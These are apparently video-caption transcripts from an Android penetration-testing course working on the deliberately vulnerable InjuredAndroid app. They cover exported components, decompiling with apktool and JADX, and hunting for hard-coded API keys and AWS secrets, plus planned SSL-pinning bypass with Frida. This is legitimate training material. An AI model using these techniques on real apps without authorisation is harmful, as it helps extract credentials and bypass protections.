of the application as a developer is we

90
00:03:49.450 --> 00:03:52.630
would mark that activity as exported equals true.

91
00:03:52.790 --> 00:03:54.350
And we'll see this in the Android manifest

92
00:03:54.350 --> 00:03:57.410
.xml of Android in just a second.

93
00:03:57.890 --> 00:04:00.430
And so any activity that is marked as

94
00:04:00.430 --> 00:04:03.970
exported equals true, we can access this application

95
00:04:04.670 --> 00:04:06.950
directly from outside of the app.

96
00:04:07.350 --> 00:04:09.070
So like something like a welcome screen, or

97
00:04:09.070 --> 00:04:11.530
even that login screen would be something that

98
00:04:11.530 --> 00:04:13.070
you want to be able to access from

99
00:04:13.070 --> 00:04:15.510
outside the application, there's no problem with just

100
00:04:15.510 --> 00:04:17.490
starting it from outside the app, right?

101
00:04:17.690 --> 00:04:19.510
But you should not be able to bypass

102
00:04:19.510 --> 00:04:21.990
that screen to get to other things like

103
00:04:21.990 --> 00:04:23.610
the account details, for example.

104
00:04:24.790 --> 00:04:26.570
The next thing we'll be talking about is

105
00:04:26.570 --> 00:04:27.410
content providers.

106
00:04:27.730 --> 00:04:30.570
And again, content providers are utilised to serve

107
00:04:30.570 --> 00:04:33.890
data from your application to other applications.

108
00:04:34.530 --> 00:04:36.590
So this can sometimes be used for sharing

109
00:04:36.590 --> 00:04:39.670
data between a bunch of related applications, if

110
00:04:39.670 --> 00:04:41.530
there's some data that needs to be used

111
00:04:41.530 --> 00:04:42.410
between them.

112
00:04:43.070 --> 00:04:45.770
And if a content provider is exported, this

113
00:04:45.770 --> 00:04:48.770
can actually be very dangerous because this can

114
00:04:48.770 --> 00:04:51.890
expose data to any user or other application

115
00:04:51.890 --> 00:04:52.810
on the device.

116
00:04:53.150 --> 00:04:55.230
Usually, if you're using a content provider, you

117
00:04:55.230 --> 00:04:56.510
want to make sure that it's going to

118
00:04:56.510 --> 00:04:58.270
be protected in at least some way.

119
00:04:58.810 --> 00:05:00.710
You can share it between related apps if

120
00:05:00.710 --> 00:05:02.810
the same developer made it.

121
00:05:03.430 --> 00:05:05.790
So if you export a content provider, this

122
00:05:05.790 --> 00:05:08.690
can be very bad because it's going to

123
00:05:08.690 --> 00:05:11.430
be exposing your application to any user on

124
00:05:11.430 --> 00:05:11.950
the device.

125
00:05:13.090 --> 00:05:15.070
Okay, that's all I had for the Android

126
00:05:15.070 --> 00:05:18.010
manifest.xml. Let's actually go in and take

127
00:05:18.010 --> 00:05:19.650
a look at that in JADX now.

128
00:05:20.730 --> 00:05:22.750
So here I am in JADX, and I

129
00:05:22.750 --> 00:05:26.070
actually have Injured Android pulled up.

130
00:05:26.390 --> 00:05:28.190
And where we can find the Android manifest

131
00:05:28.190 --> 00:05:30.750
.xml is under the Resources tab.

132
00:05:30.850 --> 00:05:32.510
You can see that there's three things here.

133
00:05:32.610 --> 00:05:34.870
You have your source code, your resources, and

134
00:05:34.870 --> 00:05:36.050
your APK signature.

135
00:05:36.790 --> 00:05:39.190
APK signature is where we'll be storing some

136
00:05:39.190 --> 00:05:40.150
basic information.

137
00:05:40.710 --> 00:05:42.490
You can see here like who created the

138
00:05:42.490 --> 00:05:45.590
application, who it's signed by, some basic information

139
00:05:45.590 --> 00:05:48.030
about things that are used for the file

140
00:05:48.030 --> 00:05:49.550
integrity of the application.

141
00:05:50.170 --> 00:05:52.330
We're going to resources here on the left,

142
00:05:53.290 --> 00:05:55.870
and then Android manifest.xml. And this is

143
00:05:55.870 --> 00:05:57.790
the exact file that we're talking about.

144
00:05:58.110 --> 00:05:59.670
And you can see that this is kind

145
00:05:59.670 --> 00:06:02.190
of the format of an Android manifest.xml

146
00:06:02.190 --> 00:06:02.610
file.

147
00:06:02.950 --> 00:06:05.710
Everything has its own little tag here that

148
00:06:05.710 --> 00:06:08.070
opens and closes when necessary.

149
00:06:08.730 --> 00:06:11.230
And here we can see our min SDK

150
00:06:11.230 --> 00:06:11.810
version.

151
00:06:12.030 --> 00:06:14.970
So this version of this application runs on

152
00:06:14.970 --> 00:06:17.510
Android API 21 and up.

153
00:06:17.510 --> 00:06:19.970
You can see the target SDK version is

154
00:06:19.970 --> 00:06:22.290
29, but the minimum is 21.

155
00:06:22.730 --> 00:06:24.730
So something we could do with this application

156
00:06:24.730 --> 00:06:27.350
is run it on something like API 29,

157
00:06:27.570 --> 00:06:29.710
and also run it on something like API

158
00:06:29.710 --> 00:06:30.270
21.

159
00:06:30.730 --> 00:06:33.570
The next section of the Android manifest is

160
00:06:33.570 --> 00:06:34.170
the permissions.

161
00:06:34.550 --> 00:06:35.690
And here they are, right?

162
00:06:36.030 --> 00:06:39.350
So this application has permissions to access network

163
00:06:39.350 --> 00:06:42.850
state, access the internet, reading and writing external

164
00:06:42.850 --> 00:06:45.130
storage, and also the ability to read the

165
00:06:45.130 --> 00:06:45.730
phone state.

166
00:06:46.530 --> 00:06:49.310
Now, none of these permissions are necessarily good

167
00:06:49.310 --> 00:06:50.770
or bad on their own.

168
00:06:51.130 --> 00:06:53.510
For example, if we're writing to external storage,

169
00:06:53.610 --> 00:06:55.310
it depends on what we're writing to the

170
00:06:55.310 --> 00:06:56.190
external storage.

171
00:06:56.450 --> 00:06:58.790
If it's like public information or something that's

172
00:06:58.790 --> 00:07:00.950
not sensitive at all for our users, we

173
00:07:00.950 --> 00:07:02.670
can feel free to go ahead and write

174
00:07:02.670 --> 00:07:03.750
to external storage.

175
00:07:04.050 --> 00:07:06.270
But if it's something sensitive, then that's when

176
00:07:06.270 --> 00:07:08.190
we would want to be aware of what

177
00:07:08.190 --> 00:07:09.770
the application is actually writing.

178
00:07:10.270 --> 00:07:12.930
Okay, so next that we've done permissions is

179
00:07:12.930 --> 00:07:13.610
activities.

180
00:07:14.250 --> 00:07:16.490
And an activity again is like a UI

181
00:07:16.490 --> 00:07:16.950
element.

182
00:07:17.150 --> 00:07:18.590
And here are a few examples.

183
00:07:18.870 --> 00:07:20.930
So like for example, in the BNAC injured

184
00:07:20.930 --> 00:07:23.530
Android, we have our flag 17 activity.

185
00:07:23.950 --> 00:07:27.090
And that will actually correspond to a UI

186
00:07:27.090 --> 00:07:29.410
screen in the application.

187
00:07:29.710 --> 00:07:32.510
So in this application, we have different screens

188
00:07:32.510 --> 00:07:33.550
for different flags.

189
00:07:33.790 --> 00:07:35.890
And this would be the flag 17 screen,

190
00:07:36.450 --> 00:07:39.170
we can also go down and look for

191
00:07:39.170 --> 00:07:42.630
any type of Android activity that is exported.

192
00:07:42.850 --> 00:07:45.410
So for example, this one BNAC injured Android

193
00:07:45.410 --> 00:07:49.050
qx v zero a, this is exported, which

194
00:07:49.050 --> 00:07:50.830
means that we can actually get to this

195
00:07:50.830 --> 00:07:53.190
UI screen without having to go through anything

196
00:07:53.190 --> 00:07:53.530
else.

197
00:07:53.650 --> 00:07:55.990
This will become relevant later when we're actually

198
00:07:55.990 --> 00:07:57.930
doing some of these flags out of the

199
00:07:57.930 --> 00:07:58.550
application.

200
00:07:59.350 --> 00:08:01.950
Now scrolling down a little bit something else

201
00:08:01.950 --> 00:08:03.710
that you would look for at this point

202
00:08:03.710 --> 00:08:07.150
is anything like a content provider that might

203
00:08:07.150 --> 00:08:08.890
be down here, you can also see that

204
00:08:08.890 --> 00:08:10.090
this provider is here.

205
00:08:10.610 --> 00:08:14.290
So there are some providers in this application,

206
00:08:14.430 --> 00:08:17.630
this one for the Firebase provider, but it's

207
00:08:17.630 --> 00:08:19.230
not exported, as you can see.

208
00:08:19.570 --> 00:08:21.130
But it's possible that you could find in

209
00:08:21.130 --> 00:08:24.110
other applications, other providers that might be exported.

210
00:08:24.690 --> 00:08:26.790
And also something else to look at is

211
00:08:26.790 --> 00:08:28.990
for any type of normal string in the

212
00:08:28.990 --> 00:08:30.310
Android manifest XML.

213
00:08:30.870 --> 00:08:33.350
Sometimes you can find things like API keys

214
00:08:33.350 --> 00:08:35.830
defined in the manifest as well, which is

215
00:08:35.830 --> 00:08:38.030
not necessarily the best way to define them.

216
00:08:38.830 --> 00:08:41.590
Something else we can look forward to at

217
00:08:41.590 --> 00:08:44.870
the top of our Android manifest, there is

218
00:08:44.870 --> 00:08:48.470
a usually a backup option and backup is

219
00:08:48.470 --> 00:08:50.330
enabled to true that can mean that our

220
00:08:50.330 --> 00:08:53.490
application is storing some additional data as a

221
00:08:53.490 --> 00:08:55.890
backup when it's running or is closed.

222
00:08:55.890 --> 00:08:57.970
So keep an eye out on the top

223
00:08:57.970 --> 00:08:58.290
here.

224
00:08:58.490 --> 00:09:01.770
Also, if there's anything about backups, or if

225
00:09:01.770 --> 00:09:03.970
the application is able to be debugged.

226
00:09:04.010 --> 00:09:05.390
So there's a couple more flags that you

227
00:09:05.390 --> 00:09:08.030
can look for if it's a debuggable application,

228
00:09:08.350 --> 00:09:10.550
or if it also allows for backups.

229
00:09:11.450 --> 00:09:14.150
So for now that polishes off our Android

230
00:09:14.150 --> 00:09:17.030
manifest XML, we'll be using this in just

231
00:09:17.030 --> 00:09:19.810
a few more videos to actually exploit some

232
00:09:19.810 --> 00:09:22.610
flags on the injured Android application.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.540 --> 00:00:02.200
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Alright, let's talk about how we can actually

2
00:00:02.200 --> 00:00:05.540
decompile an application using APKtool.

3
00:00:05.780 --> 00:00:08.700
If you've not installed APKtool, I definitely recommend

4
00:00:08.700 --> 00:00:10.940
you go back and look at the instal

5
00:00:10.940 --> 00:00:13.620
video for whichever operating system you're using.

6
00:00:14.220 --> 00:00:15.660
I'm going to do a cd to my

7
00:00:15.660 --> 00:00:17.880
desktop here on my Kali Linux box, just

8
00:00:17.880 --> 00:00:19.680
because this is where I have the Injured

9
00:00:19.680 --> 00:00:21.720
Android APK stored.

10
00:00:22.280 --> 00:00:25.320
Now how we can decompile this application, we

11
00:00:25.320 --> 00:00:28.660
can do this manually using APKtool and look

12
00:00:28.660 --> 00:00:31.299
at the actual file system of the application

13
00:00:31.299 --> 00:00:32.060
itself.

14
00:00:32.740 --> 00:00:34.920
And also in later videos we'll be using

15
00:00:34.920 --> 00:00:37.520
Jadex GUI to actually do this analysis as

16
00:00:37.520 --> 00:00:39.680
well because it helps us to keep everything

17
00:00:39.680 --> 00:00:42.100
a little bit more organised and see things

18
00:00:42.100 --> 00:00:44.060
in a more readable format.

19
00:00:44.720 --> 00:00:46.360
But so here I'm going to use the

20
00:00:46.360 --> 00:00:48.660
tool APKtool just to show you how you

21
00:00:48.660 --> 00:00:51.500
can actually decompile this application from scratch.

22
00:00:51.860 --> 00:00:53.600
I'm going to do the command d, which

23
00:00:53.600 --> 00:00:57.440
means decompile the application, and supply the release

24
00:00:57.440 --> 00:01:00.440
.apk here, whatever the name of your APK

25
00:01:00.440 --> 00:01:01.780
is that you're interested in.

26
00:01:02.980 --> 00:01:05.020
And now there are some useful flags that

27
00:01:05.020 --> 00:01:07.920
you can utilise, such as "-r", which means

28
00:01:07.920 --> 00:01:10.220
you will not decompile the resources.

29
00:01:10.520 --> 00:01:13.140
So if you are actually using an application

30
00:01:13.140 --> 00:01:15.360
with a bunch of resources, an application that

31
00:01:15.360 --> 00:01:17.820
is pretty large, this can actually save you

32
00:01:17.820 --> 00:01:20.180
some time when it comes to decompiling the

33
00:01:20.180 --> 00:01:20.780
application.

34
00:01:21.420 --> 00:01:23.120
In my case, I'm not going to use

35
00:01:23.120 --> 00:01:26.300
that flag because this Injured Android app is

36
00:01:26.300 --> 00:01:26.940
not that big.

37
00:01:27.380 --> 00:01:29.240
So I'm going to do APKtool, d, then

38
00:01:29.240 --> 00:01:30.680
the name of my APK.

39
00:01:30.820 --> 00:01:33.300
You can see that APKtool is starting to

40
00:01:33.300 --> 00:01:37.700
actually decompile the application into its individual parts.

41
00:01:39.700 --> 00:01:41.680
Okay, and if I go to my actual

42
00:01:41.680 --> 00:01:44.080
desktop now, we can see there's a new

43
00:01:44.080 --> 00:01:46.060
folder here for Injured Android.

44
00:01:46.840 --> 00:01:50.400
So basically the Android application itself is essentially

45
00:01:50.400 --> 00:01:52.500
just a directory, if you think of it

46
00:01:52.500 --> 00:01:52.920
that way.

47
00:01:53.320 --> 00:01:56.180
That directory gets zipped into one big file,

48
00:01:56.440 --> 00:01:58.620
signed, and then it gets put onto your

49
00:01:58.620 --> 00:01:59.400
Android phone.

50
00:01:59.500 --> 00:02:01.060
So that's kind of how it works from

51
00:02:01.060 --> 00:02:05.160
the source code or parts of the file

52
00:02:05.160 --> 00:02:07.300
directory in reality.

53
00:02:07.759 --> 00:02:09.320
So I'm going to click into the Injured

54
00:02:09.320 --> 00:02:11.440
Android directory here, and we can see a

55
00:02:11.440 --> 00:02:12.380
bunch of different things.

56
00:02:12.380 --> 00:02:14.120
We're going to see things that are pretty

57
00:02:14.120 --> 00:02:16.340
similar to this when we actually look at

58
00:02:16.340 --> 00:02:18.720
this with Jadex GUI, but we do see

59
00:02:18.720 --> 00:02:20.480
some different things here that we're not going

60
00:02:20.480 --> 00:02:22.220
to see in Jadex GUI.

61
00:02:22.780 --> 00:02:24.360
We do have this assets folder.

62
00:02:24.500 --> 00:02:26.120
This is going to be in both, but

63
00:02:26.120 --> 00:02:28.700
this is kind of where different assets are

64
00:02:28.700 --> 00:02:29.100
stored.

65
00:02:29.260 --> 00:02:30.600
So if we go to the Flutter assets,

66
00:02:30.780 --> 00:02:32.920
we can see there's things like the different

67
00:02:32.920 --> 00:02:33.420
fonts.

68
00:02:33.500 --> 00:02:35.260
If there's images, that might be part of

69
00:02:35.260 --> 00:02:35.800
the assets.

70
00:02:36.100 --> 00:02:39.360
If there's different special fonts or different UI

71
00:02:39.360 --> 00:02:42.120
elements, special buttons, they might be stored in

72
00:02:42.120 --> 00:02:43.220
the assets folder.

73
00:02:44.500 --> 00:02:46.460
I'm not sure what this test file is

74
00:02:46.460 --> 00:02:46.860
here.

75
00:02:47.100 --> 00:02:49.520
Some kind of just test.txt, random thing

76
00:02:49.520 --> 00:02:49.780
there.

77
00:02:50.440 --> 00:02:52.840
We can also go to Kotlin here, and

78
00:02:52.840 --> 00:02:55.280
this is where sometimes, depending on the application,

79
00:02:55.520 --> 00:02:57.480
some source code is actually stored.

80
00:02:57.800 --> 00:02:59.600
We can look through all of these folders

81
00:02:59.600 --> 00:03:01.460
to try to find anything that's suspicious.

82
00:03:01.700 --> 00:03:03.200
I've not really found that much in these

83
00:03:03.200 --> 00:03:04.360
Kotlin folders before.

84
00:03:05.320 --> 00:03:07.600
Lib, this libraries folder, is going to be

85
00:03:07.600 --> 00:03:10.140
important for when we later go and actually

86
00:03:10.140 --> 00:03:12.700
change the source code of this application.

87
00:03:13.220 --> 00:03:14.660
So we're going to be using this library

88
00:03:14.660 --> 00:03:18.380
folder to actually inject some special objects into

89
00:03:20.020 --> 00:03:22.820
our folders here, depending on the CPU architecture

90
00:03:22.820 --> 00:03:25.020
of our emulator or testing device.

91
00:03:25.300 --> 00:03:27.780
For example, here we can see these app

92
00:03:27.780 --> 00:03:30.360
.so, and what so means is a shared

93
00:03:30.360 --> 00:03:30.900
object.

94
00:03:31.100 --> 00:03:33.940
So this is utilised by the application for

95
00:03:33.940 --> 00:03:34.900
various things.

96
00:03:34.900 --> 00:03:36.540
For example, we're going to put the Frida

97
00:03:36.540 --> 00:03:40.220
gadget here in a later video, and that's

98
00:03:40.220 --> 00:03:42.160
going to be used by the application to

99
00:03:42.160 --> 00:03:45.100
get hooked so we can break SSL pinning

100
00:03:45.100 --> 00:03:46.900
later in the application.

101
00:03:47.280 --> 00:03:49.900
But you might find random things here also

102
00:03:49.900 --> 00:03:51.820
that the developer has made and put into

103
00:03:51.820 --> 00:03:52.760
shared objects.

104
00:03:53.120 --> 00:03:55.440
I've seen some developers try to hide things

105
00:03:55.440 --> 00:03:57.880
in different shared objects, such as API keys

106
00:03:57.880 --> 00:03:58.740
and things like that.

107
00:03:59.020 --> 00:04:01.320
So these are something that is definitely worth

108
00:04:01.320 --> 00:04:02.540
looking into.

109
00:04:02.540 --> 00:04:04.980
You can try to open this with something

110
00:04:04.980 --> 00:04:09.140
like, say, a text editor, or you can

111
00:04:09.140 --> 00:04:13.480
also actually look at them with other things

112
00:04:13.480 --> 00:04:15.660
that can actually decompile them successfully.

113
00:04:16.560 --> 00:04:19.079
Here I'm just going to try to find

114
00:04:19.079 --> 00:04:21.380
my text editor and see if we can

115
00:04:21.380 --> 00:04:22.720
actually see anything out of it.

116
00:04:28.830 --> 00:04:30.610
So it says it's not a valid UTF

117
00:04:30.610 --> 00:04:32.510
-8, and you can see that, yeah, everything

118
00:04:32.510 --> 00:04:34.150
here, it's going to be an ELF file,

119
00:04:34.270 --> 00:04:36.030
so you want to use something to actually

120
00:04:36.030 --> 00:04:37.070
decompile this.

121
00:04:37.070 --> 00:04:40.990
But you could use, like, strings in Kali

122
00:04:40.990 --> 00:04:42.750
Linux, so for example, if I was to

123
00:04:42.750 --> 00:04:47.690
navigate to this directory, and go to lib

124
00:04:47.690 --> 00:04:51.450
here, and let's say x86, do an ls,

125
00:04:51.510 --> 00:04:54.670
I can obviously also do a command like

126
00:04:54.670 --> 00:04:56.990
strings here, just to see if there's any

127
00:04:56.990 --> 00:04:59.370
human readable strings in the file.

128
00:04:59.370 --> 00:05:00.870
You can see that we have, like, things

129
00:05:00.870 --> 00:05:05.530
like these little, looks like methods that are

130
00:05:05.530 --> 00:05:09.330
called here, some operators, things like that.

131
00:05:09.390 --> 00:05:11.150
So that can give you some basic information

132
00:05:11.150 --> 00:05:12.550
about the file, if you just want to

133
00:05:12.550 --> 00:05:14.510
see what is human readable about them.

134
00:05:15.170 --> 00:05:17.090
Go back up a couple levels here.

135
00:05:19.910 --> 00:05:23.270
Looking through the application a bit more, we

136
00:05:23.270 --> 00:05:25.050
have the meta-inf folder, which is where

137
00:05:25.050 --> 00:05:29.350
our meta-inf manifest.mf document is usually

138
00:05:29.350 --> 00:05:29.770
stored.

139
00:05:29.910 --> 00:05:31.210
In this case, it's not there.

140
00:05:31.210 --> 00:05:32.590
I'm not sure why, it might be in

141
00:05:32.590 --> 00:05:34.670
a different folder by the way this decompiled.

142
00:05:35.110 --> 00:05:36.910
We can go to original here, and here's

143
00:05:36.910 --> 00:05:42.630
our androidmanifest.xml. Can't really read this, it's

144
00:05:42.630 --> 00:05:43.890
kind of, like, encoded, right?

145
00:05:45.730 --> 00:05:47.530
We can also go to the meta-inf

146
00:05:47.530 --> 00:05:50.010
folder, we'll see this in Jadex GUI as

147
00:05:50.010 --> 00:05:50.250
well.

148
00:05:50.430 --> 00:05:51.770
We can take a look through there, see

149
00:05:51.770 --> 00:05:55.310
if there's anything sensitive stored there, look at

150
00:05:55.310 --> 00:05:56.590
these services as well.

151
00:05:57.150 --> 00:05:58.730
We can go to res here.

152
00:05:58.730 --> 00:06:00.690
This is also going to have some different

153
00:06:00.690 --> 00:06:03.970
things, like drawable components, and also our strings

154
00:06:03.970 --> 00:06:06.010
.xml file, so we can go to values

155
00:06:06.010 --> 00:06:09.350
here, and look at the strings.xml. This

156
00:06:09.350 --> 00:06:11.730
file is going to be very important for

157
00:06:11.730 --> 00:06:13.510
later when we go through this with Jadex

158
00:06:13.510 --> 00:06:14.910
GUI, but this is a way of getting

159
00:06:14.910 --> 00:06:17.330
there manually as well when you're decompiling the

160
00:06:17.330 --> 00:06:19.570
application with apktool.

161
00:06:19.950 --> 00:06:21.570
You can see there's a bunch of strings

162
00:06:21.570 --> 00:06:23.430
in here in regards to the application.

163
00:06:23.430 --> 00:06:25.070
We will get into these way more in

164
00:06:25.070 --> 00:06:27.510
depth as we start solving some of the

165
00:06:27.510 --> 00:06:27.970
flags.

166
00:06:29.070 --> 00:06:30.350
You can take a look at all those

167
00:06:30.350 --> 00:06:32.710
XML files individually if you wanted to.

168
00:06:33.530 --> 00:06:36.570
Smally is actually where the application source code

169
00:06:36.570 --> 00:06:38.410
is stored, and we're going to see this

170
00:06:38.410 --> 00:06:40.950
as compared to Jadex GUI in just a

171
00:06:40.950 --> 00:06:41.590
few videos.

172
00:06:41.710 --> 00:06:44.270
If we go to bnack here, injured android,

173
00:06:44.830 --> 00:06:47.590
and these are all the source code for

174
00:06:47.590 --> 00:06:50.990
the entire application, but it's not very human

175
00:06:50.990 --> 00:06:51.470
-readable.

176
00:06:51.470 --> 00:06:55.170
For example, in the injured android application, we

177
00:06:55.170 --> 00:06:57.690
have an activity for every single flag we'll

178
00:06:57.690 --> 00:06:58.110
be solving.

179
00:06:58.290 --> 00:07:00.810
Say for example, this flag 1 login activity.

180
00:07:01.510 --> 00:07:03.250
We can look at this in Smally, but

181
00:07:03.250 --> 00:07:05.170
it's really not human-readable.

182
00:07:05.870 --> 00:07:07.910
There's kind of two different ways that we

183
00:07:07.910 --> 00:07:10.370
can utilise to make this more human-readable.

184
00:07:10.930 --> 00:07:14.290
One, we can use a tool called dex2jar

185
00:07:14.290 --> 00:07:16.630
converter, so it's going to convert these Smally

186
00:07:16.630 --> 00:07:19.350
files to Java so we can actually read

187
00:07:19.350 --> 00:07:19.570
them.

188
00:07:19.570 --> 00:07:22.610
But personally, I prefer to use Jadex GUI

189
00:07:22.610 --> 00:07:25.450
as opposed to putting these files through another

190
00:07:25.450 --> 00:07:28.490
converter, because Jadex GUI will do that automatically

191
00:07:28.490 --> 00:07:30.670
when we actually give it the entire APK.

192
00:07:31.130 --> 00:07:32.730
So for that reason, I'm not going to

193
00:07:32.730 --> 00:07:35.030
go through that tool in these videos, but

194
00:07:35.030 --> 00:07:37.090
it is something you can definitely look into

195
00:07:37.090 --> 00:07:39.690
if it's something you're interested in doing where

196
00:07:39.690 --> 00:07:42.310
you're actually looking at the APK manually using

197
00:07:42.310 --> 00:07:43.190
APK tool.

198
00:07:44.310 --> 00:07:46.690
Then go to the unknown directory here too.

199
00:07:47.090 --> 00:07:49.070
This might have some special things in there.

200
00:07:49.070 --> 00:07:50.650
You can see a bunch of property files.

201
00:07:50.770 --> 00:07:53.670
There's nothing sensitive stored in here, but you

202
00:07:53.670 --> 00:07:55.750
can look through them manually as well if

203
00:07:55.750 --> 00:07:56.450
you would like to.

204
00:07:57.270 --> 00:08:00.370
And we also have the androidmanifest.xml, and

205
00:08:00.370 --> 00:08:02.410
this file is going to be very important

206
00:08:02.410 --> 00:08:04.610
for our static analysis process.

207
00:08:05.130 --> 00:08:07.670
This really defines the entire application.

208
00:08:08.290 --> 00:08:13.050
We have our main SDK version here somewhere.

209
00:08:21.410 --> 00:08:23.690
We have all of our different versions here.

210
00:08:23.830 --> 00:08:25.950
I don't see the main SDK one on

211
00:08:25.950 --> 00:08:26.290
here.

212
00:08:26.930 --> 00:08:28.890
We have our permissions here, like what we

213
00:08:28.890 --> 00:08:30.330
are going to talk about in the static

214
00:08:30.330 --> 00:08:31.429
analysis section.

215
00:08:31.630 --> 00:08:33.970
We have access to internet, reading and writing,

216
00:08:34.250 --> 00:08:37.429
external storage, ability to read the phone state,

217
00:08:37.549 --> 00:08:39.970
and we have some information about the application.

218
00:08:40.250 --> 00:08:41.230
So this is kind of how we would

219
00:08:41.230 --> 00:08:42.669
go through this process manually.

220
00:08:43.130 --> 00:08:44.970
We're going to do this exact same thing,

221
00:08:45.030 --> 00:08:47.170
look at these exact same files again when

222
00:08:47.170 --> 00:08:49.090
we get to the Jadex GUI videos.

223
00:08:49.760 --> 00:08:52.870
I didn't want to just skip over using

224
00:08:52.870 --> 00:08:55.570
APKTool to be able to decompile the application,

225
00:08:55.930 --> 00:08:57.390
because we're going to have to do that

226
00:08:57.390 --> 00:08:59.770
eventually anyway when we go ahead and actually

227
00:08:59.770 --> 00:09:02.650
make some changes to the application overall.

228
00:09:03.250 --> 00:09:04.910
And those changes will be made to the

229
00:09:04.910 --> 00:09:08.130
application when we're actually patching Frida in manually,

230
00:09:08.610 --> 00:09:10.550
which is a lot further down in this

231
00:09:10.550 --> 00:09:12.690
course, but I did want to show how

232
00:09:12.690 --> 00:09:14.350
you're going to get around to these files

233
00:09:14.350 --> 00:09:17.790
by using APKTool as opposed to Jadex, so

234
00:09:17.790 --> 00:09:21.270
that you actually have some different abilities and

235
00:09:21.270 --> 00:09:23.490
different tools you can use for different scenarios

236
00:09:23.490 --> 00:09:25.410
if you choose to, or if you just

237
00:09:25.410 --> 00:09:29.370
like having the entire file here, it could

238
00:09:29.370 --> 00:09:31.750
be something that you can use instead of

239
00:09:31.750 --> 00:09:32.630
using Jadex.

240
00:09:32.850 --> 00:09:35.330
So I'll see you in the static analysis

241
00:09:35.330 --> 00:09:38.470
videos with Jadex GUI, and we'll take a

242
00:09:38.470 --> 00:09:40.970
look at these files again in the same

243
00:09:40.970 --> 00:09:43.590
exact kind of light, but we'll be seeing

244
00:09:43.590 --> 00:09:46.230
them in their Java version as opposed to

245
00:09:46.230 --> 00:09:49.910
this SMALI version that APKTool outputs them in.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.200 --> 00:00:03.080
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Let's discuss certain strings that you can find

2
00:00:03.080 --> 00:00:05.700
in Android applications that are useful for bug

3
00:00:05.700 --> 00:00:08.680
bounty hunting and also when you're just looking

4
00:00:08.680 --> 00:00:11.380
through the application in general to gain some

5
00:00:11.380 --> 00:00:14.980
more information that might actually trigger other processes

6
00:00:14.980 --> 00:00:18.120
such as reconnaissance on a URL, etc.

7
00:00:19.480 --> 00:00:22.680
So common hard-coded strings are something we're

8
00:00:22.680 --> 00:00:24.040
going to be wanting to look through our

9
00:00:24.040 --> 00:00:25.160
application for.

10
00:00:25.640 --> 00:00:27.640
And a lot of hard-coded strings can

11
00:00:27.640 --> 00:00:29.820
be found in this thing called the resources

12
00:00:30.440 --> 00:00:33.420
strings.xml. In just a minute, we'll go

13
00:00:33.420 --> 00:00:35.620
through the actual application and show you that

14
00:00:35.620 --> 00:00:36.040
file.

15
00:00:36.520 --> 00:00:39.320
But also hard-coded strings can be found

16
00:00:39.320 --> 00:00:41.400
in the activity source code.

17
00:00:41.540 --> 00:00:43.940
So for our different UI elements we might

18
00:00:43.940 --> 00:00:46.180
actually have a hard-coded string that is

19
00:00:46.180 --> 00:00:47.420
used in that activity.

20
00:00:47.980 --> 00:00:50.480
Maybe if it's a coupon code for an

21
00:00:50.480 --> 00:00:53.780
application we might be looking at a hard

22
00:00:53.780 --> 00:00:56.240
-coded coupon code that is a testing coupon

23
00:00:56.240 --> 00:00:58.720
code or could also be looking at any

24
00:00:58.720 --> 00:01:00.880
number of things for hard-coded strings in

25
00:01:00.880 --> 00:01:04.860
activity such as things like URLs, API keys,

26
00:01:05.060 --> 00:01:05.380
etc.

27
00:01:05.740 --> 00:01:08.260
So the threat vector we're looking for here

28
00:01:08.260 --> 00:01:11.580
are things like login bypass which could be

29
00:01:11.580 --> 00:01:13.980
utilized by a combination of a hard-coded

30
00:01:13.980 --> 00:01:16.640
username and password or also if you're dealing

31
00:01:16.640 --> 00:01:18.860
with an API it might be something like

32
00:01:18.860 --> 00:01:20.420
a client credential.

33
00:01:21.100 --> 00:01:25.000
A secret key and a client ID, something

34
00:01:25.000 --> 00:01:26.480
like that you'd be looking for.

35
00:01:27.060 --> 00:01:29.740
You'd also be looking for anything like URLs

36
00:01:29.740 --> 00:01:30.680
that are exposed.

37
00:01:31.020 --> 00:01:33.340
So maybe it's a new URL that you

38
00:01:33.340 --> 00:01:35.760
never knew was related to this company but

39
00:01:35.760 --> 00:01:38.000
you can find it in the Android source

40
00:01:38.000 --> 00:01:41.400
code or within the strings.xml. We'll also

41
00:01:41.400 --> 00:01:43.760
be looking for things like API keys that

42
00:01:43.760 --> 00:01:46.900
might be exposed looking for a string like

43
00:01:46.900 --> 00:01:50.120
containing API or the word secret, right?

44
00:01:50.420 --> 00:01:52.420
We'll also be looking for things like the

45
00:01:52.420 --> 00:01:55.720
Firebase URLs that might be utilized to store

46
00:01:55.720 --> 00:01:57.640
some information from this app.

47
00:01:58.000 --> 00:02:00.300
So let's jump into JADX now and actually

48
00:02:00.300 --> 00:02:02.340
take a look for some of these strings

49
00:02:02.340 --> 00:02:04.400
and I'll show you the methodology that I

50
00:02:04.400 --> 00:02:06.340
kind of use when I'm looking for these

51
00:02:06.340 --> 00:02:06.780
strings.

52
00:02:07.479 --> 00:02:10.360
So here I am in JADX and I'm

53
00:02:10.360 --> 00:02:12.820
going to go to resources here and then

54
00:02:12.820 --> 00:02:15.800
I'm going to go to resources.arsc and

55
00:02:15.800 --> 00:02:18.560
I have the Android application open here.

56
00:02:18.800 --> 00:02:20.220
I'm going to click res here.

57
00:02:20.700 --> 00:02:23.240
I'm going to click values next and this

58
00:02:23.240 --> 00:02:25.680
is where a lot of XML files are

59
00:02:25.680 --> 00:02:27.140
defined for the application.

60
00:02:27.680 --> 00:02:29.980
For example, if we click this attributes here

61
00:02:29.980 --> 00:02:33.240
has some basic information about different attributes that

62
00:02:33.240 --> 00:02:35.180
are utilized throughout the application.

63
00:02:35.360 --> 00:02:37.820
You can see things like badges, bar lengths,

64
00:02:38.500 --> 00:02:40.040
things like that that are kind of related

65
00:02:40.040 --> 00:02:41.140
to the UI.

66
00:02:41.140 --> 00:02:44.200
We can also go to these strings.xml

67
00:02:44.200 --> 00:02:46.740
here and now we see a bunch of

68
00:02:46.740 --> 00:02:49.040
hard-coded strings and right here at the

69
00:02:49.040 --> 00:02:51.020
top of the hard-coded strings we actually

70
00:02:51.020 --> 00:02:54.120
see an AWS ID in an AWS secret

71
00:02:54.120 --> 00:02:54.420
key.

72
00:02:54.760 --> 00:02:56.400
This will be utilized in one of our

73
00:02:56.400 --> 00:02:57.660
flags a bit later.

74
00:02:58.160 --> 00:03:00.280
